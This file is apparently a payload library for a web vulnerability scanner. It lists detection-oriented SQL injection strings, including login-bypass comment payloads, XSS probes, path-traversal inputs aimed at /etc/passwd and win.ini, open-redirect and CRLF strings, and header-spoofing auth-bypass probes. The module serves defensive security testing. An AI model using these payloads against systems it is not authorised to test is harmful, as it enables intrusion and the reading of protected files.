/**
 * Payload Library — curated, non-destructive payload sets for live probes.
 *
 * Every payload here is:
 *   1. Detection-oriented — payloads that REVEAL a vulnerability (via error,
 *      timing, or content reflection) without modifying or destroying data.
 *   2. Industry-standard — drawn from OWASP, SecLists, PortSwigger, and
 *      established pen-test references. Nothing exotic.
 *   3. Pre-filtered against `live-probe-runner.js` `FORBIDDEN_PATTERNS` —
 *      no destructive SQL, no shell-bombs, no DoS payloads.
 *
 * Why this matters: any pen-test scanner is a bytecode away from being a
 * weapon. By centralising the payload set, every probe module shares the
 * same safety floor. New payload classes need an explicit add here.
 */

'use strict';

// ─── SQL Injection ────────────────────────────────────────────────────────
//
// Detection vectors:
//   - Error-based: ' triggers a database error reflected in the response
//   - Boolean: ' OR '1'='1 vs ' OR '1'='2 changes response shape
//   - UNION: discover column count and types
//   - Timing: pg_sleep / SLEEP — flagged as forbidden if seconds >= 10
//
// NO destructive payloads. NO DROP / TRUNCATE / DELETE.

const SQL_INJECTION_PAYLOADS = [
  // Error-based — trigger a syntax error to confirm injection
  { class: 'error', payload: "'", detect: 'sql-error-reflected' },
  { class: 'error', payload: "\"", detect: 'sql-error-reflected' },
  { class: 'error', payload: "')", detect: 'sql-error-reflected' },
  { class: 'error', payload: "';", detect: 'sql-error-reflected' },
  { class: 'error', payload: "1' AND 1=CONVERT(int,'a')--", detect: 'sql-error-mssql' },

  // Boolean — same query with two booleans should change the response
  { class: 'boolean-true', payload: "' OR '1'='1", detect: 'boolean-true-pair' },
  { class: 'boolean-false', payload: "' OR '1'='2", detect: 'boolean-false-pair' },
  { class: 'boolean-true', payload: "1 OR 1=1", detect: 'boolean-true-pair' },
  { class: 'boolean-false', payload: "1 OR 1=2", detect: 'boolean-false-pair' },

  // Comment-out termination — confirms injection by truncating the
  // remainder of the query.
  { class: 'comment', payload: "admin'--", detect: 'auth-bypass-comment' },
  { class: 'comment', payload: "admin'#", detect: 'auth-bypass-comment' },
  { class: 'comment', payload: "admin'/*", detect: 'auth-bypass-comment' },

  // UNION discovery — non-destructive column-count probe
  { class: 'union', payload: "' UNION SELECT NULL--", detect: 'union-error' },
  { class: 'union', payload: "' UNION SELECT NULL,NULL--", detect: 'union-error' },

  // Timing — capped at 3s to avoid DoS impact (forbidden filter blocks >= 10s)
  { class: 'timing', payload: "1' AND SLEEP(3)--", detect: 'timing-mysql', timingMs: 3000 },
  { class: 'timing', payload: "1'; WAITFOR DELAY '0:0:3'--", detect: 'timing-mssql', timingMs: 3000 },
  { class: 'timing', payload: "1' AND pg_sleep(3)--", detect: 'timing-postgres', timingMs: 3000 },
];

// ─── XSS (Reflected) ──────────────────────────────────────────────────────
//
// Detection: payload echoed verbatim in response with proper context (HTML
// tag / attribute / JS). We don't execute payloads — we look for echo.

const XSS_PAYLOADS = [
  // Classic reflection
  { class: 'html', payload: '<script>__gatetest_xss_probe__</script>', detect: 'tag-reflected' },
  { class: 'html', payload: '"><script>__gatetest_xss_probe__</script>', detect: 'attr-break-tag-reflected' },
  { class: 'html', payload: "'><script>__gatetest_xss_probe__</script>", detect: 'attr-break-tag-reflected' },
  // Event handler
  { class: 'event', payload: '" onmouseover="__gatetest_xss_probe__', detect: 'event-handler-injected' },
  { class: 'event', payload: "' onerror='__gatetest_xss_probe__", detect: 'event-handler-injected' },
  // Image
  { class: 'image', payload: '<img src=x onerror=__gatetest_xss_probe__>', detect: 'img-onerror-reflected' },
  // SVG
  { class: 'svg', payload: '<svg onload=__gatetest_xss_probe__>', detect: 'svg-onload-reflected' },
  // JavaScript URI
  { class: 'uri', payload: 'javascript:__gatetest_xss_probe__', detect: 'javascript-uri-reflected' },
  // HTML entity bypass
  { class: 'entity', payload: '&lt;script&gt;__gatetest_xss_probe__&lt;/script&gt;', detect: 'entity-bypass' },
];

// ─── Path Traversal ───────────────────────────────────────────────────────
//
// Detection: response contains canonical /etc/passwd or Windows boot.ini
// content marker. We use NON-SENSITIVE markers — /etc/passwd starts with
// 'root:x:0:0:' on Linux and that string is detected.

const PATH_TRAVERSAL_PAYLOADS = [
  { class: 'unix-passwd', payload: '../../../../etc/passwd', detect: 'passwd-marker' },
  { class: 'unix-passwd', payload: '../../../../../../etc/passwd', detect: 'passwd-marker' },
  { class: 'unix-passwd', payload: '/etc/passwd', detect: 'passwd-marker' },
  { class: 'url-encoded', payload: '..%2f..%2f..%2f..%2fetc%2fpasswd', detect: 'passwd-marker' },
  { class: 'double-encoded', payload: '..%252f..%252fetc%252fpasswd', detect: 'passwd-marker' },
  { class: 'null-byte', payload: '../../../../etc/passwd%00.jpg', detect: 'passwd-marker' },
  { class: 'windows', payload: '..\\..\\..\\..\\windows\\win.ini', detect: 'win-ini-marker' },
  { class: 'windows-unc', payload: '\\\\..\\\\..\\\\windows\\\\win.ini', detect: 'win-ini-marker' },
];

const PATH_TRAVERSAL_MARKERS = {
  'passwd-marker': /\broot:x:0:0:/,
  'win-ini-marker': /\[(boot loader|fonts|extensions)\]/i,
};

// ─── Open Redirect ────────────────────────────────────────────────────────
//
// Detection: 30x response with Location header pointing to attacker domain.

const OPEN_REDIRECT_PAYLOADS = [
  { class: 'direct', payload: 'https://example.gatetest-probe.invalid', detect: 'location-external' },
  { class: 'protocol-relative', payload: '//example.gatetest-probe.invalid', detect: 'location-protocol-relative' },
  { class: 'backslash', payload: '\\\\example.gatetest-probe.invalid', detect: 'location-backslash-bypass' },
  { class: 'cr-lf', payload: '/%0d%0aLocation:%20https://example.gatetest-probe.invalid', detect: 'crlf-injection' },
  { class: 'whitelist-bypass', payload: 'https://example.gatetest-probe.invalid#@trusted.com', detect: 'fragment-trick' },
  { class: 'whitelist-bypass', payload: 'https://trusted.com@example.gatetest-probe.invalid', detect: 'userinfo-trick' },
];

// ─── Auth Bypass / Header Manipulation ───────────────────────────────────

const AUTH_BYPASS_HEADERS = [
  { class: 'forwarded', headers: { 'X-Forwarded-For': '127.0.0.1' }, detect: 'spoofed-internal-ip' },
  { class: 'forwarded', headers: { 'X-Real-IP': '127.0.0.1' }, detect: 'spoofed-internal-ip' },
  { class: 'forwarded', headers: { 'X-Originating-IP': '127.0.0.1' }, detect: 'spoofed-internal-ip' },
  { class: 'admin', headers: { 'X-Admin': 'true' }, detect: 'admin-flag-trusted' },
  { class: 'admin', headers: { 'X-User-Role': 'admin' }, detect: 'role-flag-trusted' },
  { class: 'method-override', headers: { 'X-HTTP-Method-Override': 'PUT' }, detect: 'method-override-honoured' },
  { class: 'host-spoof', headers: { Host: 'localhost' }, detect: 'host-header-trusted' },
];

// ─── CSRF — detection of missing token, not exploitation ─────────────────

const CSRF_DETECTION_HEADERS = {
  // We send a known-bad origin and check if the server processes the
  // state-changing request. If yes, CSRF protection is missing.
  Origin: 'https://example.gatetest-probe.invalid',
  Referer: 'https://example.gatetest-probe.invalid/',
};

// ─── Helpers ─────────────────────────────────────────────────────────────

function getPayloadsByClass(set, klass) {
  return set.filter((p) => p.class === klass);
}

function summarisePayloadSet(set) {
  const classes = {};
  for (const p of set) {
    classes[p.class] = (classes[p.class] || 0) + 1;
  }
  return { total: set.length, byClass: classes };
}

module.exports = {
  SQL_INJECTION_PAYLOADS,
  XSS_PAYLOADS,
  PATH_TRAVERSAL_PAYLOADS,
  PATH_TRAVERSAL_MARKERS,
  OPEN_REDIRECT_PAYLOADS,
  AUTH_BYPASS_HEADERS,
  CSRF_DETECTION_HEADERS,
  getPayloadsByClass,
  summarisePayloadSet,
};
